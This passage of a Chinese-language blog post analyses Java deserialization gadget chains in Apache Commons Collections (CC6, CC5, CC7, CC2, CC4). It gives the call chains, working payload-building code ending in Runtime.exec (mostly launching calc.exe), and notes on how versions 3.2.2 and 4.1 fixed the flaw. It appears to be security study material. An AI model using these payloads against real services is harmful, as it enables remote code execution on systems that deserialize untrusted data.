<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Base64.decodeBase64(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>



<h3 id="（5）版本问题"><a href="#（5）版本问题" class="headerlink" title="（5）版本问题"></a>（5）版本问题</h3><p>因为和cc1一样用AnnotationInvocationHandler做入口类，所以8u71后也无法使用。</p>
<h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chain</span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler#readObject()  </span><br><span class="line">TransformedMap父类AbstractInputCheckedMapDecorator$MapEntry#setValue(value)</span><br><span class="line">TransformedMap#checkSetValue(value)</span><br><span class="line">transformerChain#transform()  </span><br><span class="line">TrAXFilter()</span><br><span class="line">templatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>



<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>HashMap+TiedMapEntry+LazyMap+ChainedTransformer</p>
<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）TiedMapEntry"><a href="#（1）TiedMapEntry" class="headerlink" title="（1）TiedMapEntry"></a>（1）TiedMapEntry</h3><p>构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个实用的 装饰器类。它的主要功能是将一个 Map 的键值对动态绑定到 Map.Entry 接口上，使得键值对的操作直接影响到原始的 Map 对象。</p>
<p>比如说setValue也会动态更新map中对应key的value值。</p>
<h3 id="（2）与cc1的关系"><a href="#（2）与cc1的关系" class="headerlink" title="（2）与cc1的关系"></a>（2）与cc1的关系</h3><p>CommonsCollections1这个利用链在Java 8u71以后，这个利用链不能再利用了。主要原因是AnnotationInvocationHandler#readObject的逻辑变化了。</p>
<p>解决Java高版本利用问题，实际上就是在找上下文中是否还有其他调用LazyMap#get()的地方。</p>
<p>找到的类是org.apache.commons.collections.keyvalue.TiedMapEntry，在其getValue方法</p>
<p>中调用了this.map.get，而其hashCode方法调用了getValue方法。</p>
<h3 id="（3）利用HashMap调用hashCode方法"><a href="#（3）利用HashMap调用hashCode方法" class="headerlink" title="（3）利用HashMap调用hashCode方法"></a>（3）利用HashMap调用hashCode方法</h3><p>在HashMap的readObject方法中，调用到了hash(key)，而hash方法中，调用到了</p>
<p>key.hashCode()。所以，我们只需要让这个key等于TiedMapEntry对象，即可连接上前面的分析过</p>
<p>程，构成一个完整的Gadget。</p>
<p>下面的payload和chain用的简化版的，ysoserial给的比较复杂。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="comment">// tiedMapEntry.hashCode --&gt; tiedMapEntry.getValue --&gt; LazyMap.get(key)</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"><span class="comment">// hashMap.readObject() --&gt; hashMap.hash(key) --&gt; tiedMapEntry.hashCode()</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br></pre></td></tr></table></figure>



<p>Gadget</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* HashMap#readObject()</span><br><span class="line"> * HashMap#hash(key)</span><br><span class="line"> *      TiedMapEntry#hashCode()</span><br><span class="line"> *      TiedMapEntry#getValue()</span><br><span class="line"> *          LazyMap.get(key)</span><br><span class="line"> *              ChainedTransformer.transform()</span><br></pre></td></tr></table></figure>



<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>BadAttributeValueExpException+TiedMapEntry+LazyMap+ChainedTransformer</p>
<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）与CC6的关系"><a href="#（1）与CC6的关系" class="headerlink" title="（1）与CC6的关系"></a>（1）与CC6的关系</h3><p>CC5 与 CC6 时的分析一样，都是通过 TiedMapEntry 来触发 LazyMap.get()，CC6 利用的 TiedMapEntry的getValue() ，实际上在 TiedMapEntry 类中还有 equals()、 toString() 方法都调用了 getValue()，CC5 使用的是 toString()。</p>
<h3 id="2-readObjerct触发toString"><a href="#2-readObjerct触发toString" class="headerlink" title="(2) readObjerct触发toString"></a>(2) readObjerct触发toString</h3><p>用到了新的类BadAttributeValueExpException，它的readObject方法会调用其Object类型的val成员的toString方法。要求安全管理器为空。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732098098791-e10c92d1-711e-4e93-9e00-5561f39cce47.png"></p>
<p>Gadget</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    TiedMapEntry.toString()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                ConstantTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>



<h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><p><del>只在8u76且没有设置安全管理器的情况下生效</del></p>
<p>实验8u412也可以，这个先不管</p>
<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p> HashTable+LazyMap+ChainedTransformer</p>
<h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）HashTable与LazyMap"><a href="#（1）HashTable与LazyMap" class="headerlink" title="（1）HashTable与LazyMap"></a>（1）HashTable与LazyMap</h3><p>HashTable的readObject()会调用reconstitutionPut()。</p>
<p>reconstitutionPut()首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在table数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到tabl数组中。</p>
<p>CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在判断重复元素的时候校验了两个元素的hash值是否一样，然后接着key会调用equals方法判断key是否重复时就会触发漏洞。</p>
<p>而我们正是需要调用LazyMap的equals方法（其实是包装的HashMap的equals方法）从而触发LazyMap的get方法从而触发Transformer。</p>
<p>需要注意的是，在添加第一个元素时并不会进入if语句调用equals方法进行判断，因此Hashtable中的元素至少为2个并且元素的hash值也必须相同的情况下才会调用equals方法，否则不会触发漏洞。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732107464110-c53f5dfa-8023-433a-8dae-dad8d715218b.png"></p>
<h3 id="（2）Hash一致"><a href="#（2）Hash一致" class="headerlink" title="（2）Hash一致"></a>（2）Hash一致</h3><p>找两个hash值相同的字符串分别放入两个lazymap。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732109697532-9f946744-5fe0-4fbf-8d7e-e306dcda0638.png"></p>
<h3 id="（3）为什么两个lazyMap不能是同一个？"><a href="#（3）为什么两个lazyMap不能是同一个？" class="headerlink" title="（3）为什么两个lazyMap不能是同一个？"></a>（3）为什么两个lazyMap不能是同一个？</h3><p>因为hashTable只允许两个key的hash值一致，如果两个key也一样的话，就不会put重复的key进入。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732110677394-d1899cb9-9911-4b5f-a76e-30e47577b874.png"></p>
<h3 id="（4）关于lazyMap2集合中的第二个元素（yy-yy）从何而来"><a href="#（4）关于lazyMap2集合中的第二个元素（yy-yy）从何而来" class="headerlink" title="（4）关于lazyMap2集合中的第二个元素（yy&#x3D;yy）从何而来"></a>（4）关于lazyMap2集合中的第二个元素（yy&#x3D;yy）从何而来</h3><p>Hashtable在调用put方法添加元素的时候会调用equals方法判断是否为同一对象，而在equals中会调用LazyMap的get方法put一个元素yy。（此处不太清晰，后续可以调一下）</p>
<p>因此payload中还需要移除lazyMap2中的yy。</p>
<h2 id="Gadget-1"><a href="#Gadget-1" class="headerlink" title="Gadget"></a>Gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">chain:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Hashtable.readObject()</span></span><br><span class="line"><span class="comment">   AbstractMap.equals()</span></span><br><span class="line"><span class="comment">        LazyMap.get()</span></span><br><span class="line"><span class="comment">            ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">               execArgs),</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">       <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">       <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">       lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">       lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">       <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">       hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">       hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">       Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">       lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> hashtable;</span><br></pre></td></tr></table></figure>



<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>PriorityQueue+TransformingComparator+ChainedTransformer</p>
<h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）commons-collections4-版本号4-0"><a href="#（1）commons-collections4-版本号4-0" class="headerlink" title="（1）commons-collections4 版本号4.0"></a>（1）commons-collections4 版本号4.0</h3><p>cc2和cc4都是为commons-collections4准备的。</p>
<p>commons-collections这个包之所有能攒出那么多利用链来，除了因为其使用量大，技术上的原因是其中包含了一些可以执行任意方法的Transformer。所以，在commons-collections中找Gadget的过程，实际上可以简化为，找一条从Serializable#readObject()方法到Transformer#transform()方法的调用链。</p>
<h3 id="（2）TransformingComparator与Transformer"><a href="#（2）TransformingComparator与Transformer" class="headerlink" title="（2）TransformingComparator与Transformer"></a>（2）TransformingComparator与Transformer</h3><p>TransformingComparator是一个比较器，与普通比较器不同的是，TransformingComparator在构造时会传入一个Transformer， 在比较之前使用Transformer对元素进行转换，然后再根据转换后的值进行比较。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732105309010-98017ab1-40e3-4f26-ab8b-9ecaab1092a6.png"></p>
<h3 id="（3）PriorityQueue-与Comparator"><a href="#（3）PriorityQueue-与Comparator" class="headerlink" title="（3）PriorityQueue 与Comparator"></a>（3）PriorityQueue 与Comparator</h3><p>PriorityQueue是一个优先队列，在构造时可以传入自定义的比较器，用于确定队列中元素的优先级，从而确定元素的顺序。</p>
<p>PriorityQueue#readObject()中调用了heapify()方法，heapify()中调用了siftDown()，siftDown()中调用了siftDownUsingComparator()，siftDownUsingComparator()中调用的comparator.compare()。</p>
<h2 id="Gadget-2"><a href="#Gadget-2" class="headerlink" title="Gadget"></a>Gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">				...</span></span><br><span class="line"><span class="comment">					TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">						InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">							Method.invoke()</span></span><br><span class="line"><span class="comment">								Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>





<p>Payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// 至少需要2个元素才会触发排序和比较</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure>

<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）与CC2的关系"><a href="#（1）与CC2的关系" class="headerlink" title="（1）与CC2的关系"></a>（1）与CC2的关系</h3><p>CC2中ChainedTransformer用的是InvokerTransformer,CC4换成了InstantiateTransformer+TrAXFilter + TemplatesImpl。其余一样。</p>
<h1 id="版本与修复"><a href="#版本与修复" class="headerlink" title="版本与修复"></a>版本与修复</h1><h2 id="CC1，CC3，CC5，CC6，CC7是否可以在commons-collections4中使用吗？"><a href="#CC1，CC3，CC5，CC6，CC7是否可以在commons-collections4中使用吗？" class="headerlink" title="CC1，CC3，CC5，CC6，CC7是否可以在commons-collections4中使用吗？"></a>CC1，CC3，CC5，CC6，CC7是否可以在commons-collections4中使用吗？</h2><p>可以，但是commons-collections4没有是LazyMap.decorate这个方法了，要换成LazyMap.lazyMap。</p>
<h2 id="CC2，CC4可以在commons-collections3中使用吗？"><a href="#CC2，CC4可以在commons-collections3中使用吗？" class="headerlink" title="CC2，CC4可以在commons-collections3中使用吗？"></a>CC2，CC4可以在commons-collections3中使用吗？</h2><p>不能。因为这条利用链中的关键</p>
<p>类org.apache.commons.collections4.comparators.TransformingComparator，在commons-</p>
<p>collections4.0以前是版本中是没有实现Serializable接口的，无法在序列化中使用。</p>
<h2 id="Commons-Collections-3-2-2是如何修复的？"><a href="#Commons-Collections-3-2-2是如何修复的？" class="headerlink" title="Commons Collections 3.2.2是如何修复的？"></a>Commons Collections 3.2.2是如何修复的？</h2><p>代码中增加了一个方法FunctorUtils#checkUnsafeSerialization，用于检测反序列化是否安全。如果开发者没有设置全局配置org.apache.commons.collections.enableUnsafeSerialization&#x3D;true，即默认情况下会抛出异常。</p>
<p>这个检查在常⻅的危险Transformer类（InstantiateTransformer、InvokerTransformer、PrototypeFactory、CloneTransformer等）的readObject里进行调用，所以，当我们反序列化包含这些对象时就会抛出一个异常。</p>
<h2 id="Commons-Collections-4-1是如何修复的？"><a href="#Commons-Collections-4-1是如何修复的？" class="headerlink" title="Commons Collections 4.1是如何修复的？"></a>Commons Collections 4.1是如何修复的？</h2><p>危险Transformer类不再实现Serializable接口，也就是说，他们几个彻底无法序列化和反序列化了。</p>

      
    </div>
    <footer class="article-footer">
